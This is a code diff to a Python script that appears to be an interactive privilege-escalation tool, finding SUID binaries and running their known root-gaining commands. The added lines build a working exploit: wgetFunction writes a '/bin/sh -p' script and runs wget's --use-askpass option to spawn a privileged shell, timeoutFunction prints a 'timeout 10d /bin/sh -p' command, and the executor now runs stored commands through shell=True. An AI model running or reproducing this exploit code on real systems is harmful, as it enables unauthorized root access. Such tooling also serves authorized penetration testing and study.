@@ -75,6 +75,25 @@ def optionParsing():
     return find_value, exec_value
 
 
+def wgetFunction():
+    # create a temporary file with the shell commands
+    temp_file = subprocess.run(['mktemp'], stdout=subprocess.PIPE).stdout.decode().strip()
+    subprocess.run(['chmod', '+x', temp_file])
+    with open(temp_file, 'w') as f:
+        f.write('#!/bin/sh -p\n/bin/sh -p 1>&0\n')
+
+    # run the command with wget
+    subprocess.run(['wget', '--use-askpass={}'.format(temp_file), '0'])
+
+    # cleanup the temporary file
+    subprocess.run(['rm', temp_file])
+    return 
+
+def timeoutFunction():
+    
+    print ("please run this command:\ntimeout 10d /bin/sh -p")
+    return 
+
 
 def Goodbye():   
     print(f"{RED}Goodbye!{RESET}")
@@ -171,7 +190,6 @@ def openCsv():
 
 #the input is th list of found bin in format like {"id":"{"id":"1","name":"cat", "cmd":"cat '$file'", "type": "File Read"}"} and the id you want to execute
 def findOption():
-    print(RESTOR + ERASETOEND)    
     cmds = suidbitSearch()
    
     if cmds != None:
@@ -190,8 +208,6 @@ def findOption():
 
 #the input is th list of found bin in format like {"id":"{"id":"1","name":"cat", "cmd":"cat '$file'", "type": "File Read"}"} and the id you want to execute
 def executeOption(id = 0):
-    print(RESTOR + ERASETOEND)
-    print("entre")
     id = input(f"Enter the command ID opress 'q' to exit.\n")
     if id == 'q':
         sys.exit()
@@ -200,7 +216,7 @@ def executeOption(id = 0):
         if id == 'q':
             sys.exit()
 
-    if ids[id]["type"] ==  "File Read":
+    if ids[id]["type"] == "File Read":
         print("file read")
         filename = input("Enter the file name that you want to read\n")
         if ids[id]["notes"] != '':
@@ -213,18 +229,22 @@ def executeOption(id = 0):
         else:
             print(result.stderr)
     elif ids[id]["type"] == "Gain Root Access":
-        if ids[id]["name"] in ["timeout","mv", "perl","python", "ruby","gcc", "as","wget"]:
-            print(ids[id]["notes"])
+        if ids[id]["name"] == "wget":
+            wgetFunction()
+        elif ids[id]["name"] == "timeout":
+            timeoutFunction()
+        elif ids[id]["name"] == "mv":
+            print ("move command")
         else:
             cmd = ids[id]["cmd"]
-            #print(cmd)
+            print(cmd)
             result = subprocess.run(cmd, shell=True)
             if result.returncode == 0 :
                 print(result.stdout)
             else:
                 print (result.stderr)
     else:
-        pass
+        print ("pass")
     return 
 
 
